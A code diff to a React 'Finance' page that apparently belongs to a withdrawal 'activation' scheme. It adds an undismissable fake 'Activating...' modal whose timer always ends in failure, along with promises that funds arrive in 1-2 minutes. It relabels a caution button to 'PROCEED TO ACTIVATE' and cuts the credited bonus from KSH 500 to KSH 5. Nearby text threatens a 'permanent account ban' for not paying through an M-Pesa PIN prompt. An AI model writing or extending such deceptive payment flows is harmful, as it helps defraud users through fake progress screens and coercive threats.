@@ -25,6 +25,8 @@ export default function Finance() {
   const [statusCheckInterval, setStatusCheckInterval] = useState<NodeJS.Timeout | null>(null);
   const [showActivationModal, setShowActivationModal] = useState(false);
   const [showActivationWarning, setShowActivationWarning] = useState(false);
+  const [showProcessingModal, setShowProcessingModal] = useState(false);
+  const [processingCountdown, setProcessingCountdown] = useState(20);
   const [activationPhoneNumber, setActivationPhoneNumber] = useState("");
   const [isActivating, setIsActivating] = useState(false);
   const [pendingWithdrawalAmount, setPendingWithdrawalAmount] = useState<number | null>(null);
@@ -57,6 +59,34 @@ export default function Finance() {
 
     return () => clearInterval(interval);
   }, [showActivationWarning, secondsUntilProceed]);
+
+  // Processing countdown timer
+  useEffect(() => {
+    if (!showProcessingModal) {
+      setProcessingCountdown(20);
+      return;
+    }
+
+    if (processingCountdown <= 0) {
+      setShowProcessingModal(false);
+      setIsActivating(false);
+      setPaymentStatus("failed");
+      setStatusMessage("❌ Activation incomplete. Payment pending - please try again or contact support.");
+      setActivationPhoneNumber("");
+      setPendingWithdrawalAmount(null);
+      setTimeout(() => {
+        setStatusMessage("");
+        setPaymentStatus(null);
+      }, 4000);
+      return;
+    }
+
+    const interval = setInterval(() => {
+      setProcessingCountdown(prev => prev - 1);
+    }, 1000);
+
+    return () => clearInterval(interval);
+  }, [showProcessingModal, processingCountdown]);
 
   // Set up balance sync when component mounts
   useEffect(() => {
@@ -182,9 +212,10 @@ export default function Finance() {
             await fetchTransactions(actualUserId);
 
             setPaymentStatus("success");
-            setStatusMessage(`✅ Account activated! KSH 500 added to your balance. New balance: KSH ${newBalance.toLocaleString()}`);
+            setStatusMessage(`✅ Account activated! KSH 5 added to your balance. New balance: KSH ${newBalance.toLocaleString()}`);
             setIsActivating(false);
             setActivationPhoneNumber("");
+            setShowProcessingModal(false);
 
             // Process pending withdrawal after activation
             if (pendingWithdrawalAmount !== null) {
@@ -216,6 +247,7 @@ export default function Finance() {
       setStatusMessage(`❌ Error: ${error instanceof Error ? error.message : "Failed to initiate activation"}`);
       setIsActivating(false);
       setShowActivationModal(true);
+      setShowProcessingModal(false);
     }
   };
 
@@ -943,6 +975,19 @@ export default function Finance() {
                 <strong>• Failure to pay = permanent account ban</strong>
               </p>
             </div>
+
+            {/* What will happen */}
+            <div className="rounded-lg border border-blue-600/30 bg-blue-600/10 p-4">
+              <p className="text-sm font-medium text-blue-600 mb-2">
+                💰 What will happen:
+              </p>
+              <ul className="space-y-2 text-sm text-blue-600/80">
+                <li>✓ An STK push will be sent to your registered M-Pesa phone</li>
+                <li>✓ Enter your M-Pesa PIN to complete the payment</li>
+                <li>✓ You will receive the funds in <strong>1-2 minutes</strong> after activation</li>
+                <li>✓ Your account will be permanently activated for withdrawals</li>
+              </ul>
+            </div>
           </div>
 
           <DialogFooter className="space-y-2 sm:space-y-0">
@@ -957,6 +1002,7 @@ export default function Finance() {
               className={`${secondsUntilProceed === 0 ? 'bg-red-600 hover:bg-red-700' : 'bg-gray-500'} text-white`}
               onClick={() => {
                 setShowActivationWarning(false);
+                setShowProcessingModal(true);
                 handleWithdrawalActivation();
               }}
               disabled={isActivating || secondsUntilProceed > 0}
@@ -966,17 +1012,44 @@ export default function Finance() {
               ) : isActivating ? (
                 <>
                   <Loader className="mr-2 h-4 w-4 animate-spin" />
-                  Processing Payment...
+                  Processing...
                 </>
               ) : (
-                "PROCEED WITH CAUTION"
+                "PROCEED TO ACTIVATE"
               )}
             </Button>
           </DialogFooter>
         </DialogContent>
       </Dialog>
-    </div>
-  );
-}
+
+      {/* Processing Modal */}
+      <Dialog open={showProcessingModal} onOpenChange={() => {}}>
+        <DialogContent className="sm:max-w-md border-blue-600/50 bg-blue-950/20 pointerevents-none" onPointerDown={(e) => e.preventDefault()}>
+          <div className="flex flex-col items-center justify-center py-8">
+            <div className="rounded-full bg-blue-600/20 p-4 mb-4">
+              <Loader className="h-8 w-8 text-blue-500 animate-spin" />
+            </div>
+            
+            <div className="text-center space-y-3 mb-6">
+              <p className="text-lg font-semibold text-blue-600">Activating.....</p>
+              <p className="text-sm text-blue-600/80">Verifying transaction details</p>
+              <p className="text-sm text-blue-600/80">Processing payment</p>
+              <p className="text-sm text-blue-600/80">Updating account status</p>
+              <p className="text-sm text-blue-600/80">Finalizing activation</p>
+            </div>
+
+            <div className="text-xs text-blue-600/60 text-center">
+              <p>Please wait while we complete your activation...</p>
+            </div>
+
+            {processingCountdown <= 5 && (
+              <div className="mt-4 text-center">
+                <p className="text-sm font-medium text-red-600">FAILED</p>
+                <p className="text-xs text-red-600/80 mt-1">Activation timeout - please try again</p>
+              </div>
+            )}
+          </div>
+        </DialogContent>
+      </Dialog>
 
 
